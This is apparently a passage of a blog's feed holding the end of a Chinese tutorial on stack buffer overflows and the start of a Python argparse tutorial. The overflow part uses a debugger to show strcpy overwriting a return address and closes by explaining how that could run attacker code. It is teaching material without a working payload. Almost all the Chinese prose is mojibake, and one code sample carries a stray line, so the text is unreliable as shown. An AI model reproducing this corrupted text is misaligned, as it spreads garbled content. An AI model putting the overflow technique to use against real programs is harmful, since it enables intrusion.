·ä¸€æ¥ï¼Œå¦‚æœæœ‰æœªçŸ¥çš„ç¨‹åºè·³åˆ°è¿™ç‰‡åŒºåŸŸï¼Œå°±ä¸ä¼šå‡ºç°å´©æºƒçš„æƒ…å†µï¼Œè€Œæ˜¯ç›´æ¥æ–­ä¸‹æ¥äº†ã€‚å½“ç„¶ï¼Œè¿™ä¸ªé—®é¢˜ä¸æˆ‘ä»¬çš„ç¼“å†²åŒºæº¢å‡ºæ²¡ä»€ä¹ˆå…³ç³»ã€‚</p><p>ç»§ç»­æ‰§è¡Œï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220222811127.png" alt="image-20191220222811127"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220222849625.png" alt="image-20191220222849625"></p><p>è¿™é‡Œå°†<code>betao</code>å…¥æ ˆäº†ï¼Œè¯´æ˜æ‰§è¡Œåˆ°äº†strcpy()ï¼Œè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡IDAæ¥æŸ¥çœ‹ä¸€ä¸‹ï¼Œstrcpy()å‡½æ•°çš„ä½ç½®</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223306866.png" alt="image-20191220223306866"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223344255.png" alt="image-20191220223344255"></p><p>ç»§ç»­æ‰§è¡Œï¼ŒæŸ¥çœ‹å †æ ˆä¸­çš„æƒ…å†µ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223433751.png" alt="image-20191220223433751"></p><p>å‘ç°<code>strcpy</code>å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ¥æ”¶å­—ç¬¦ä¸²æ‰€ä¿å­˜çš„ä½ç½®ï¼Œå…¶ä¿å­˜çš„ä½ç½®ä¸º<code>0X0012FF78</code>(bufferå˜é‡)</p><p>åˆ°è¿™é‡Œç¨‹åºæ— å¼‚å¸¸ï¼Œæ­£å¸¸æ‰§è¡Œï¼Œç»§ç»­F8ï¼Œç›´è‡³retn</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223754120.png" alt="image-20191220223754120"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223820151.png" alt="image-20191220223820151"></p><p>è¿™ä¸ªåœ°å€æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰å‘¢ï¼Ÿæ²¡é”™å°±æ˜¯è¿”å›åœ°å€</p><h2 id="å¯¹æº¢å‡ºç¨‹åºåˆ†æ"><a href="#å¯¹æº¢å‡ºç¨‹åºåˆ†æ" class="headerlink" title="å¯¹æº¢å‡ºç¨‹åºåˆ†æ"></a>å¯¹æº¢å‡ºç¨‹åºåˆ†æ</h2><p>å…¶ä½™è·Ÿä¸Šé¢æ­¥éª¤ç±»ä¼¼ï¼Œæˆ‘ä»¬ç›´æ¥è·³è‡³æ‰§è¡Œ<code>strcpy</code>å‡½æ•°çš„å†…å­˜åœ°å€åˆ†æ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220224251689.png" alt="image-20191220224251689"></p><p>ç»§ç»­æ‰§è¡Œï¼Œæ‰§è¡Œè‡³retn,æŸ¥çœ‹å †æ ˆæ­¤æ—¶çš„æƒ…å†µ:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220224431503.png" alt="image-20191220224431503"></p><p>æˆ‘ä»¬å³é”®æ˜¾ç¤ºä¸€ä¸‹asciiç ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220224531935.png" alt="image-20191220224531935"></p><p>ç”±ä¸Šå›¾å¯çŸ¥ï¼š åŸæœ¬è¿”å›å€¼ï¼š<code>0x00401699</code>åœ°å€è¢«å ç”¨ ä¸”æŒ‡å‘é”™è¯¯çš„åœ°å€ï¼ˆæˆ–ä¸åº”è¯¥çš„åœ°å€ï¼‰</p><p>F8æ‰§è¡Œï¼Œç»“æœå¦‚å›¾</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220224744720.png" alt="image-20191220224744720"> </p><p>æ­¤æ—¶æˆ‘ä»¬å‘ç°äº†ä¸¤ä»¶äº‹ï¼Œä¸€ä»¶æ˜¯ODä¸­çš„åæ±‡ç¼–ä»£ç çª—å£æ˜¯ç©ºçš„ï¼Œè¯´æ˜<code>0x006F6174</code>åœ°å€å¤„ä¸å­˜åœ¨æŒ‡ä»¤ï¼Œæˆ–è€…è¯´å®ƒå°±æ˜¯ä¸€ä¸ªæ— æ•ˆåœ°å€ã€‚ç¬¬äºŒä»¶äº‹æ˜¯ODå¼¹å‡ºäº†é”™è¯¯å¯¹è¯æ¡†ï¼Œæç¤ºæˆ‘ä»¬è¯¥åœ°å€å‡ºé”™ï¼Œè¿™ä¸æˆ‘ä»¬ç›´æ¥æ‰§è¡Œç¨‹åºæ—¶æ‰€å¼¹å‡ºçš„é”™è¯¯å¯¹è¯æ¡†æœ‰å‡ åˆ†ç±»ä¼¼ã€‚</p><p>è¿™é‡Œå…ˆè¡¥å……ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆè¿”å›åœ°å€æ˜¾ç¤ºçš„æ˜¯<code>tao</code>,è€Œä¸æ˜¯<code>aob</code>ï¼Œå› ä¸ºbuffer ç©ºé—´åªæœ‰8ä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘è¾“å…¥äº†15ä¸ªå­—èŠ‚ï¼Œbufferåé¢çš„å››ä¸ªå­—èŠ‚æ˜¯ebpçš„åœ°å€.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">betaobetaobetao</span><br><span class="line">æ‹·è´å­—ç¬¦  EBP     è¦†ç›–å†…å®¹</span><br></pre></td></tr></table></figure><h2 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h2><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰§è¡Œ<code>test2.exe</code>ç¨‹åº</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220230136615.png" alt="image-20191220230136615"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220230205983.png" alt="image-20191220230205983"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220230259576.png" alt="image-20191220230259576"></p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>ç¼“å†²åŒºæ¼æ´çš„åŸç†ï¼Œå®ƒå°±æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥äº†è¿‡é•¿çš„å­—ç¬¦ï¼Œè€Œç¼“å†²åŒºæœ¬èº«åˆæ²¡æœ‰æœ‰æ•ˆçš„éªŒè¯æœºåˆ¶ï¼Œå¯¼è‡´è¿‡é•¿çš„å­—ç¬¦å°†è¿”å›åœ°å€è¦†ç›–æ‰äº†ï¼Œå½“æˆ‘ä»¬çš„å‡½æ•°éœ€è¦è¿”å›çš„æ—¶å€™ï¼Œç”±äºæ­¤æ—¶çš„è¿”å›åœ°å€æ˜¯ä¸€ä¸ªæ— æ•ˆåœ°å€ï¼Œå› æ­¤å¯¼è‡´ç¨‹åºå‡ºé”™ã€‚</p><p>é‚£ä¹ˆä¾æ®è¿™ä¸ªåŸç†ï¼Œå‡è®¾æˆ‘ä»¬æ‰€è¦†ç›–çš„è¿”å›åœ°å€æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œè€Œåœ¨è¯¥åœ°å€å¤„åˆåŒ…å«ç€æœ‰æ•ˆçš„æŒ‡ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç³»ç»Ÿå°±ä¼šæ¯«ä¸çŠ¹è±«åœ°è·³åˆ°è¯¥åœ°å€å¤„å»æ‰§è¡ŒæŒ‡ä»¤ã€‚å› æ­¤ï¼Œå¦‚æœæƒ³åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºçš„æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªæœ‰æ•ˆåœ°å€å‡ºæ¥ï¼Œç„¶åå°†æˆ‘ä»¬æƒ³è®©è®¡ç®—æœºæ‰§è¡Œçš„ä»£ç å†™å…¥è¯¥åœ°å€ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±é€šè¿‡ç¨‹åºçš„æ¼æ´ï¼Œè®©è®¡ç®—æœºæ‰§è¡Œäº†æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ç¨‹åºã€‚</p><blockquote><p>æœ¬æ–‡ä¾‹å­å‚è€ƒæ¥æºï¼š  <a href="https://blog.csdn.net/ioio_jy/article/details/48316029">https://blog.csdn.net/ioio_jy/article/details/48316029</a> </p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; ä»€ä¹ˆæ˜¯ç¼“å†²åŒºæº¢å‡ºï¼Ÿï¼Ÿï¼Ÿå…ˆä½œä¸‹ç±»æ¯”ï¼Œå¦‚æœæŸä¸ªäººæŠŠä¸€ç“¶å•¤é…’å…¨éƒ¨å€’å…¥ä¸€ä¸ªå°æ¯å­ä¸­ï¼Œé‚£è£…ä¸ä¸‹çš„å•¤é…’å°±ä¼šå››å¤„å†’å‡ºï¼Œæµåˆ°æ¡Œå­ä¸Šã€‚&lt;/p&gt;
&lt;p&gt;  åŒæ ·çš„é“ç†ï¼Œåœ¨è®¡ç®—æœºå†…éƒ¨ï¼Œè¾“å…¥æ•°æ®é€šå¸¸è¢«å­˜æ”¾åœ¨ä¸€ä¸ªä¸´æ—¶ç©ºé—´å†…ï¼Œè¿™ä¸ªä¸´æ—¶å­˜æ”¾ç©ºé—´å°±è¢«ç§°ä¸ºç¼“å†²åŒºï¼Œç¼“å†²åŒºçš„é•¿åº¦äº‹å…ˆå·²ç»è¢«ç¨‹åºæˆ–è€…æ“ä½œç³»ç»Ÿå®šä¹‰</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="æº¢å‡ºæ”»å‡»" scheme="https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Python3--argparseæ¨¡å—ç®€è¦ä½¿ç”¨</title>
    <link href="https://taonn.github.io/2020/10/04/Python3-argparse%E6%A8%A1%E5%9D%97%E7%AE%80%E8%A6%81%E4%BD%BF%E7%94%A8/"/>
    <id>https://taonn.github.io/2020/10/04/Python3-argparse%E6%A8%A1%E5%9D%97%E7%AE%80%E8%A6%81%E4%BD%BF%E7%94%A8/</id>
    <published>2020-10-04T01:27:05.000Z</published>
    <updated>2021-03-16T05:27:41.357Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Python3ä¸­çš„argparseæ¨¡å—ï¼Œæ˜¯ç”¨æ¥åš<strong>å‘½ä»¤è¡Œå‚æ•°è§£æçš„</strong>ï¼Œå› ä¸ºoptparseæ¨¡å—å·²ç»ä¸å†æ›´æ–°ï¼Œæ‰€ä»¥ç‰¹æ­¤æ¥ä¸ºargparseçš„ä½¿ç”¨åšä¸ªç¬”è®°</p><p>å®˜ç½‘æ˜¯è¿™æ ·è¯´æ˜çš„ï¼š</p><p> <em>3.2ç‰ˆåå·²å¯ç§»é™¤ï¼š</em>è¯¥<a href="https://docs.python.org/zh-cn/3.7/library/optparse.html#module-optparse"><code>optparse</code></a>æ¨¡å—å·²å¼ƒç”¨ï¼Œå°†ä¸å†è¿›è¡Œå¼€å‘ï¼›è¯¥<a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#module-argparse"><code>argparse</code></a>æ¨¡å—å°†ç»§ç»­å¼€å‘ </p><p>optparseå®˜æ–¹è¯´æ˜åœ°å€ï¼š <a href="https://docs.python.org/zh-cn/3.7/library/optparse.html">https://docs.python.org/zh-cn/3.7/library/optparse.html</a> </p><p>è¿™ä¸ªæ¨¡å—çš„åŸºæœ¬ä½¿ç”¨æ­¥éª¤è·Ÿoptparseå·®åˆ«ä¸å¤§ï¼Œä½¿ç”¨æ­¥éª¤å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import argparse # å¯¼å…¥æ¨¡å—</span><br><span class="line"></span><br><span class="line">parser &#x3D; argparse.ArgumentParser()  # åˆ›å»ºä¸€ä¸ªè§£æå¯¹è±¡</span><br><span class="line">parser.add_argument() # æ·»åŠ å‚æ•°</span><br><span class="line">parser.parse_args() # è§£æ</span><br></pre></td></tr></table></figure><p>**argparse.ArgumentParse()**æ–¹æ³•æœ‰å¾ˆå¤šå‚æ•°ï¼Œä½†æ˜¯æœ€å¸¸ç”¨çš„å°±æ˜¯description,</p><ul><li><p>prog = None         # ç¨‹åºåï¼Œé»˜è®¤ä¸ºsys.argv[0]ã€‚å¦å¤–ï¼Œå¦‚æœä½ éœ€è¦åœ¨helpä¸­ä½¿ç”¨åˆ°ç¨‹åºçš„åå­—ï¼Œå¯ä»¥ä½¿ç”¨%(prog)s </p></li><li><p>description = None   # helpæ—¶æ˜¾ç¤ºçš„å¼€å§‹æ–‡å­—</p></li><li><p>epilog = None   # helpæ—¶æ˜¾ç¤ºçš„ç»“å°¾æ–‡å­—</p></li><li><p>prefix_chars=â€™-â€˜,   - å‘½ä»¤çš„å‰ç¼€ï¼Œé»˜è®¤æ˜¯â€˜-â€™ </p></li><li><p>add_help=True  # æ˜¯å¦å¢åŠ -h/â€“helpé€‰é¡¹ï¼Œé»˜è®¤æ˜¯True) </p></li><li><p>usageï¼š# æè¿°ç¨‹åºç”¨é€”çš„å­—ç¬¦ä¸² </p></li><li><p>â€¦.. </p></li></ul><p>æ›´è¯¦ç»†çš„ä½¿ç”¨ï¼ŒæŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼š <a href="https://docs.python.org/zh-cn/3.7/library/argparse.html">https://docs.python.org/zh-cn/3.7/library/argparse.html</a> </p><p><strong>add_argument()</strong> æ–¹æ³•å’Œå‚æ•°ï¼Œæˆ‘ä»¬å®é™…ä½¿ç”¨æ¥ä»‹ç»:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># file-name:print_name.py</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Dome of argparse &#39;)</span><br><span class="line">    parser.add_argument(&#39;--name&#39;, &#39;-n&#39;, default&#x3D;&#39;Tao&#39;)</span><br><span class="line"></span><br><span class="line">    return parser</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    parser &#x3D; main()</span><br><span class="line">    args &#x3D; parser.parse_args()</span><br><span class="line">    name &#x3D; args.name</span><br><span class="line">    print(&#39;Hello &#123;0&#125;&#39;.format(name))</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç æ‰§è¡Œç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_name.py --name dog</span><br><span class="line"><span class="comment"># è¾“å‡ºï¼šHello dog</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆå¯¼å…¥äº†<code>argparse</code>æ¨¡å—ï¼Œç„¶åé€šè¿‡ <code>argparser.ArgumentParser</code>å‡½æ•°ç”Ÿæˆargparserå¯¹è±¡ ï¼Œå…¶ä¸­è¿™ä¸ªå‡½æ•°çš„<code>description</code>å­—æ®µï¼Œè¡¨ç¤ºåœ¨å‘½ä»¤è¡Œæ˜¾ç¤ºçš„å¸®åŠ©ä¿¡æ¯æ—¶è¾“å‡ºè¿™ä¸ªç¨‹åºçš„æè¿°ä¿¡æ¯ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡<code>add_argument</code>å‡½æ•°æ¥å¢åŠ å‚æ•°ï¼Œè¿™é‡Œæˆ‘æ·»åŠ äº†ä¸¤ä¸ªå‚æ•°<code>-n</code>å’Œ<code>--name</code>ï¼Œå…¶ä¸­æœ‰ä¸ªé»˜è®¤å€¼å­—æ®µ<code>default</code>æ˜¯Taoã€‚ç„¶åæˆ‘ä»¬è¿™é‡Œå‘ç°ï¼ŒåŒä¸€ä¸ªå€¼çš„è®¾å®šå¯ä»¥è®¾ç½®å¤šä¸ªå‚æ•°ã€‚</p><p>è¿™é‡Œé»˜è®¤å€¼çš„æ„æ€æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä¸ä¼ è¿™ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‚æ•°çš„å€¼é»˜è®¤å°±æ˜¯<code>Tao</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_name.py</span><br><span class="line"><span class="comment"># è¾“å‡ºï¼šHello Tao</span></span><br></pre></td></tr></table></figure><p> æœ€åæˆ‘ä»¬é€šè¿‡argpaserå¯¹è±¡çš„<code>parser_args</code>å‡½æ•°æ¥è·å–æ‰€æœ‰å‚æ•°<code>args</code>ï¼Œç„¶åé€šè¿‡<code>args.name</code>çš„æ–¹å¼å¾—åˆ°æˆ‘ä»¬è®¾ç½®çš„<code>-name</code>å‚æ•°çš„å€¼ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œargparseé»˜è®¤çš„å‚æ•°åå°±æ˜¯<code>--name</code>å½¢å¼é‡Œé¢<code>--</code>åé¢çš„å­—ç¬¦ä¸² ã€‚</p><p>ä¸€ .</p><ul><li><code>default</code> ï¼šæ²¡æœ‰è®¾ç½®å€¼æƒ…å†µä¸‹çš„é»˜è®¤å‚æ•°</li></ul><p>äºŒ .</p><ul><li><code>required</code> ï¼šè¡¨ç¤ºè¿™ä¸ªå‚æ•°æ˜¯å¦ä¸€å®šéœ€è¦è®¾ç½®</li></ul><p>å¦‚æœè®¾ç½®äº†<code>required=True</code>,ç„¶åˆ™åœ¨å®é™…çš„è¿ç”¨ä¸­ä¸è®¾ç½®è¯¥å‚æ•°ï¼Œé‚£ä¹ˆåˆ™ä¼šæŠ¥é”™ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python print_name.py</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage: print_name.py [-h] --name NAME</span><br><span class="line">print_name.py: error: the following arguments are required: --name</span><br></pre></td></tr></table></figure><ul><li><code>type</code>  æŒ‡å®šå‚æ•°ç±»å‹ï¼Œé»˜è®¤æ˜¯str, è¿˜æœ‰int,floatç­‰</li></ul><p>å¦‚æœä½ çš„ç¨‹åºéœ€è¦æ•´æ•°è¿ç®—çš„è¯ï¼Œé‚£ä¹ˆéœ€è¦æŒ‡å®š<code>type=int</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Dome of argparse &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--num&#x27;</span>, type=int)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = main()</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    sum = args.num</span><br><span class="line">    print(<span class="number">1</span>+sum)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python print_num.py --num <span class="number">10</span></span><br><span class="line"><span class="comment"># è¾“å‡ºï¼š11</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰æŒ‡å®šçš„è¯ï¼Œåˆ™ä¼šæŠ¥é”™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python print_num.py --num <span class="number">10</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;print_num.py&quot;</span>, line <span class="number">13</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(<span class="number">1</span>+sum)</span><br><span class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> +: <span class="string">&#x27;int&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>dest</code>  è®¾ç½®å‚æ•°åœ¨ä»£ç ä¸­çš„å˜é‡å</p><ul><li>argparseé»˜è®¤çš„å˜é‡åæ˜¯<code>--</code>æˆ–<code>-</code>åé¢çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä½ ä¹Ÿå¯ä»¥é€šè¿‡<code>dest=xxx</code>æ¥è®¾ç½®å‚æ•°çš„å˜é‡åï¼Œç„¶ååœ¨ä»£ç ä¸­ç”¨<code>args.xxx</code>æ¥è·å–å‚æ•°çš„å€¼ </li></ul></li><li><p><code>choices</code>  å‚æ•°å€¼åªèƒ½ä»å‡ ä¸ªé€‰é¡¹é‡Œé¢é€‰æ‹©</p></li><li><p><code>help</code>   æŒ‡å®šå‚æ•°çš„è¯´æ˜ä¿¡æ¯</p><ul><li>å‘Šè¯‰åˆ«äººè¿™ä¸ªå‚æ•°æœ‰å•¥ä½œç”¨</li></ul></li></ul><p>é€šè¿‡ä»£ç æ¥è§£é‡Šä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choices</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Choices Dome&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, dest=<span class="string">&#x27;choice&#x27;</span>, required=<span class="literal">True</span>, choices=[<span class="string">&#x27;Tao&#x27;</span>,<span class="string">&#x27;xiaoming&#x27;</span>], help=<span class="string">&#x27;Choose a person you love&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = choices()</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    choice = args.choice</span><br><span class="line">    print(<span class="string">&#x27;You choices is &#123;0&#125;&#x27;</span>.format(choice))</span><br><span class="line">i</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¸®åŠ©ä¿¡æ¯çš„è¾“å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python print_choices.py -h</span><br><span class="line"></span><br><span class="line">usage: print_choices.py [-h] -c &#123;Tao,xiaoming&#125;</span><br><span class="line"></span><br><span class="line">Choices Dome</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help         show this help message <span class="keyword">and</span> exit</span><br><span class="line">  -c &#123;Tao,xiaoming&#125;  Choose a person you love  <span class="comment"># åœ¨è¿™é‡Œï¼ï¼ï¼</span></span><br></pre></td></tr></table></figure><p>é€‰æ‹©ä¸€ä¸ªå‚æ•°ï¼Œç»“æœæ‰§è¡Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_choices.py -c Tao</span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœï¼š You choices is Tao</span></span><br></pre></td></tr></table></figure><ul><li><code>nargs</code>   å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°ï¼ŒæŒ‡å®šè¿™ä¸ªå‚æ•°åé¢çš„valueæœ‰å¤šå°‘ä¸ªï¼Œé»˜è®¤ä¸º1.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å€¼å«ä¹‰</span><br><span class="line">N  å‚æ•°çš„ç»å¯¹ä¸ªæ•°ï¼ˆä¾‹å¦‚ï¼š<span class="number">3</span>ï¼‰</span><br><span class="line"><span class="string">&#x27;?&#x27;</span>   <span class="number">0</span>æˆ–<span class="number">1</span>ä¸ªå‚æ•°</span><br><span class="line"><span class="string">&#x27;*&#x27;</span>   <span class="number">0</span>æˆ–æ‰€æœ‰å‚æ•°</span><br><span class="line"><span class="string">&#x27;+&#x27;</span>   æ‰€æœ‰ï¼Œå¹¶ä¸”è‡³å°‘ä¸€ä¸ªå‚æ•°</span><br></pre></td></tr></table></figure><p>ä»£ç å®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parser</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;nargs Dome&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, dest=<span class="string">&#x27;name&#x27;</span> ,required=<span class="literal">True</span>, type=str, nargs=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = get_parser()</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    names = <span class="string">&#x27;, &#x27;</span>.join(args.name)</span><br><span class="line">    print(<span class="string">&#x27;Hello %s&#x27;</span> % names)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_name.py -n Tao xiaoming</span><br><span class="line">Hello Tao, xiaoming</span><br></pre></td></tr></table></figure><p>å…³äºadd_argumentè¯¦ç»†å‚æ•°ä½¿ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ArgumentParser.add_argument(name <span class="keyword">or</span> flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])</span><br><span 